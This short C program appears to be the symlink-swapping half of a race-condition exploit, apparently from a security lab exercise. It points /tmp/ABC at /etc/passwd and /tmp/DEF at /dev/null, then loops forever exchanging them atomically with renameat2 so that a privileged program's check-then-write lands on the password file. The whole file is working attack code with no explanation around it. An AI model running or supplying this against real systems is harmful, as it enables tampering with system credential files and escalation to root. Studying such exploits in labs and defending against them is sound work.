#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>

int main(){
        unsigned int flags = RENAME_EXCHANGE;
        unlink("/tmp/DEF"); symlink("/dev/null", "/tmp/DEF");
        unlink("/tmp/ABC"); symlink("/etc/passwd", "/tmp/ABC");
	while(1) {
        renameat2(0, "/tmp/DEF", 0, "/tmp/ABC", flags);
	}
    return(0);
}

